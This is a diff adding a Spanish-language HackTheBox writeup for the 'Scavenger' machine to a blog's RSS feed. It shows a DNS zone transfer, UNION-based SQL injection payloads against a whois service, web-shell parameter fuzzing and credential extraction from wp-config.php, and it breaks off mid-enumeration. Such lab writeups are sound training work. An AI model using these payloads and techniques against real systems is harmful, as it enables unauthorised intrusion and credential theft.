@@ -5,9 +5,754 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 21 Jun 2023 02:08:51 +0000</pubDate>
-    <lastBuildDate>Wed, 21 Jun 2023 02:08:51 +0000</lastBuildDate>
+    <pubDate>Sat, 24 Jun 2023 00:35:12 +0000</pubDate>
+    <lastBuildDate>Sat, 24 Jun 2023 00:35:12 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Scavenger - htb writeup</title>
+        <description>&lt;p&gt;Hola de nuevo el dia de hoy vamos a resolver la máquina &lt;code&gt;Scavenger&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo &lt;code&gt;whois&lt;/code&gt;, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo &lt;code&gt;pcap&lt;/code&gt; para descubrir un &lt;code&gt;rootkit&lt;/code&gt; ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Scavenger
+❯ ls
+ Scavenger
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.155
+PING 10.10.10.155 (10.10.10.155) 56(84) bytes of data.
+64 bytes from 10.10.10.155: icmp_seq=1 ttl=63 time=123 ms
+
+--- 10.10.10.155 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 123.005/123.005/123.005/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:11 GMT
+Initiating SYN Stealth Scan at 22:11
+Scanning 10.10.10.155 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.155
+Discovered open port 21/tcp on 10.10.10.155
+Discovered open port 80/tcp on 10.10.10.155
+Discovered open port 53/tcp on 10.10.10.155
+Discovered open port 43/tcp on 10.10.10.155
+Completed SYN Stealth Scan at 22:12, 26.69s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.155
+Host is up, received user-set (0.16s latency).
+Scanned at 2023-06-23 22:11:41 GMT for 26s
+Not shown: 65496 filtered tcp ports (no-response), 32 filtered tcp ports (port-unreach), 2 closed tcp ports (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+43/tcp open  whois   syn-ack ttl 63
+53/tcp open  domain  syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
+           Raw packets sent: 131040 (5.766MB) | Rcvd: 39 (2.604KB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,22,43,53,80 10.10.10.155 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:12 GMT
+Nmap scan report for 10.10.10.155
+Host is up (0.19s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
+|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
+|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
+43/tcp open  whois?
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|     This query returned 0 object
+|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Debian
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port43-TCP:V=7.92%I=7%D=6/23%Time=649618CF%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,A9,&quot;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+SF:0returned\x200\x20object\r\n&quot;)%r(GetRequest,A9,&quot;%\x20SUPERSECHOSTING\x2
+SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
+SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
+SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&quot;)%r(HTT
+SF:POptions,A9,&quot;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+SF:0returned\x200\x20object\r\n&quot;)%r(RTSPRequest,A9,&quot;%\x20SUPERSECHOSTING\x
+SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
+SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
+SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&quot;)%r(He
+SF:lp,A9,&quot;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
+SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
+SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
+SF:ned\x200\x20object\r\n&quot;)%r(SSLSessionReq,103,&quot;%\x20SUPERSECHOSTING\x20W
+SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
+SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
+SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
+SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
+SF:)\x20for\x20operation\x20'like'&quot;)%r(TerminalServerCookie,103,&quot;%\x20SUPE
+SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
+SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
+SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
+SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
+SF:al_ci,COERCIBLE\)\x20for\x20operation\x20'like'&quot;)%r(TLSSessionReq,103,&quot;
+SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
+SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
+SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
+SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
+SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 114.00 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;21&lt;/td&gt;
+      &lt;td&gt;FTP&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;43&lt;/td&gt;
+      &lt;td&gt;WHOIS&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;53&lt;/td&gt;
+      &lt;td&gt;DNS&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Observamos un servicio web ejecutandose en el puerto &lt;code&gt;80&lt;/code&gt; y en el puerto &lt;code&gt;43&lt;/code&gt; obtenemos un dominio que vamos a proceder a añadir en nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.155 supersechosting.htb www.supersechosting.htb&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora intentamos visualizar el servicio en el navegador se nos muestra un mensaje de que el servicio no esta disponible.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ya que nmap tambien nos reporto que el puerto &lt;code&gt;53&lt;/code&gt; se encuentra abierto asi que con la herramienta &lt;code&gt;dig&lt;/code&gt; vamos a intentar realizar un ataque de transferencia de zona, para poder obtener dominios validos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ dig @10.10.10.155 supersechosting.htb axfr
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 supersechosting.htb axfr
+; (1 server found)
+;; global options: +cmd
+supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
+supersechosting.htb.	604800	IN	NS	ns1.supersechosting.htb.
+supersechosting.htb.	604800	IN	MX	10 mail1.supersechosting.htb.
+supersechosting.htb.	604800	IN	A	10.10.10.155
+ftp.supersechosting.htb. 604800	IN	A	10.10.10.155
+mail1.supersechosting.htb. 604800 IN	A	10.10.10.155
+ns1.supersechosting.htb. 604800	IN	A	10.10.10.155
+whois.supersechosting.htb. 604800 IN	A	10.10.10.155
+www.supersechosting.htb. 604800	IN	A	10.10.10.155
+supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
+;; Query time: 436 msec
+;; SERVER: 10.10.10.155#53(10.10.10.155)
+;; WHEN: Fri Jun 23 22:23:59 GMT 2023
+;; XFR size: 10 records (messages 1, bytes 275)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos una lista de subdominios que validaremos, despues de añadirlos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.155 ftp.supersechosting.htb mail1.supersechosting.htb ns1.supersechosting.htb whois.supersechosting.htb www.supersechosting.htb&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Logramos resolver un dominio, el cual nos da información acerca del servicio, como que se esta usando &lt;code&gt;php&lt;/code&gt; y &lt;code&gt;mysql&lt;/code&gt;, ademas tambien podemos ver información acerca de &lt;code&gt;whois&lt;/code&gt; que curiosamente tiene expuesto la maquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al conectarnos a &lt;code&gt;whois&lt;/code&gt; a traves de telnet, vemos que utiliza como base de datos el servicio de &lt;code&gt;mariadb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.155 43
+Trying 10.10.10.155...
+Connected to 10.10.10.155.
+Escape character is '^]'.
+ 
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+Connection closed by foreign host.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;El servicio &lt;code&gt;WHOIS&lt;/code&gt; siempre necesita utilizar una base de datos para almacenar y extraer la información. Por lo tanto, una posible &lt;code&gt;SQLInjection&lt;/code&gt; podría funcionar al consultar la base de datos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
+'
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''') limit 1' at line 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Mandamos una &lt;code&gt;'&lt;/code&gt; en la consulta y vemos que recibimos un error de &lt;code&gt;sql&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
+') ORDER BY 2#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a proceder a enumear la base de datos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
+') UNION SELECT database(), 2#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+whois
+
+❯ nc 10.10.10.155 43
+') UNION SELECT table_name,2 from information_schema.tables where table_schema='whois'#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+customers
+
+❯ nc 10.10.10.155 43
+') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 0,1#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+id^C
+
+❯ nc 10.10.10.155 43
+') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 1,1#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+domain^C
+
+❯ nc 10.10.10.155 43
+') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 2,1#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+data
+
+❯ nc 10.10.10.155 43
+') UNION SELECT domain, 2 FROM  customers#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 4 object
+supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Encontramos mas subdominios y entre ellos uno curioso &lt;code&gt;rentahacker.htb&lt;/code&gt;, que si lo vemos en la pagina web no nos muestra información, pero podemos ejecutar un ataque de transferencia de zona de este subdominio.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ dig @10.10.10.155 rentahacker.htb axfr
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 rentahacker.htb axfr
+; (1 server found)
+;; global options: +cmd
+rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+rentahacker.htb.	604800	IN	NS	ns1.supersechosting.htb.
+rentahacker.htb.	604800	IN	MX	10 mail1.rentahacker.htb.
+rentahacker.htb.	604800	IN	A	10.10.10.155
+mail1.rentahacker.htb.	604800	IN	A	10.10.10.155
+sec03.rentahacker.htb.	604800	IN	A	10.10.10.155
+www.rentahacker.htb.	604800	IN	A	10.10.10.155
+rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+;; Query time: 443 msec
+;; SERVER: 10.10.10.155#53(10.10.10.155)
+;; WHEN: Fri Jun 23 22:49:07 GMT 2023
+;; XFR size: 8 records (messages 1, bytes 251)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos dos subdominios nuevos que luego de añadirlos, visualizamos una pagina en &lt;code&gt;sec03.rentahacker.htb&lt;/code&gt; con una imagen en relación a un hacker que ya nos da que pensar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Anteriormente en uno de los subdominios vemos que se estaba utilizando como lenguaje a &lt;code&gt;php&lt;/code&gt;, asi que vamos a tratar de buscar archivos con esa extensión con la ayuda de &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://sec03.rentahacker.htb/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000015:   302        0 L      0 W        0 Ch        &quot;index&quot;                                                                                                               
+000000217:   200        57 L     340 W      4729 Ch     &quot;signup&quot;                                                                                                              
+000000027:   302        0 L      0 W        0 Ch        &quot;search&quot;                                                                                                              
+000000053:   200        57 L     339 W      4712 Ch     &quot;login&quot;                                                                                                               
+000000685:   200        0 L      0 W        0 Ch        &quot;core&quot;                                                                                                                
+000000190:   200        57 L     332 W      4667 Ch     &quot;wiki&quot;                                                                                                                
+000001688:   200        0 L      0 W        0 Ch        &quot;shell&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Encontramos un archivo con un nombre muy descriptivo &lt;code&gt;shell&lt;/code&gt; que curiosamente existe, y quiero pensar que al ser una shell debe ejecutarse a traves de un parametro que si bien no sabemos el nombre, con &lt;code&gt;wfuzz&lt;/code&gt; igualmente podemos tratar de averiguarlo ejecutando un comando.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &quot;http://sec03.rentahacker.htb/shell.php?FUZZ=whoami&quot;
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000012593:   200        1 L      1 W        8 Ch        &quot;hidden&quot;                                                                                                              
+000014350:   200        0 L      0 W        0 Ch        &quot;guildwars&quot;                                                                                                           
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos que el nombre parametro corresponde a &lt;code&gt;hidden&lt;/code&gt; y si lo validamos tenemos ejecución de comandos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora tratamos de mandarnos una reverse shell a nuestra maquina, vemos que nos resulta imposible debido a que la maquina tiene implementado reglas de firewall. Por ello para poder movernos de manera mas comoda vamos a usar una herramienta que nos permite tener acceso a una &lt;code&gt;tty&lt;/code&gt; sobre http.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&quot;&gt;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para usarla simplemente debemos modificar la dirección url y el parametro al que corresponde nuestra shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
+whoami
+&amp;gt; ib01c03
+ls -l /home
+&amp;gt; total 24
+drwx------ 4 ib01c01 customers 4096 Sep  1  2021 ib01c01
+drwx------ 3 ib01c02 customers 4096 Sep  1  2021 ib01c02
+drwx------ 4 ib01c03 customers 4096 Sep  1  2021 ib01c03
+dr-xrwx--- 3 ib01ftp support   4096 Dec 10  2018 ib01ftp
+drwx------ 3 ib01www support   4096 Dec 10  2018 ib01www
+drwx------ 2 support support   4096 Sep 13  2022 support
+ls -l /home/ib01c03
+&amp;gt; total 26576
+-rw-r--r--  1 ib01c03 customers 16689687 Oct 17  2018 bugtracker.2.18.tgz
+drwxr-xr-x 15 ib01c03 customers    12288 Dec 10  2018 sec03
+-rw-r--r--  1 ib01c03 customers 10503584 Dec  6  2018 wordpress.tgz
+drwxr-xr-x  5 ib01c03 customers     4096 Sep  1  2021 www
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos un archivo comprimido en &lt;code&gt;wordpress&lt;/code&gt;, asi que podemos tratar de buscar el archivo &lt;code&gt;wp-config.php&lt;/code&gt; que generalmente contiene credenciales.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;find / -name wp-config.php 2&amp;gt;/dev/null
+&amp;gt; /home/ib01c03/www/wp-config.php
+cat /home/ib01c03/www/wp-config.php
+&amp;gt; &amp;lt;?php
+/** The name of the database for WordPress */
+define('DB_NAME', 'ib01c03');
+
+/** MySQL database username */
+define('DB_USER', 'ib01c03');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'Thi$sh1tIsN0tGut');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos unas credenciales validas pero que correspoden al mismo usuario &lt;code&gt;ib01c03&lt;/code&gt;, ahora recordemos que cuando obtuvimos subdominios, se nos reporto uno asociado a &lt;code&gt;mail1.rentahacker.htb&lt;/code&gt;, por ello podemos listar la ruta &lt;code&gt;/var/spool/mail&lt;/code&gt; buscando información.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -l /var/spool/mail/*
+&amp;gt; -rw-rw-r-- 1 root mail 1274 Dec 10  2018 /var/spool/mail/ib01c03
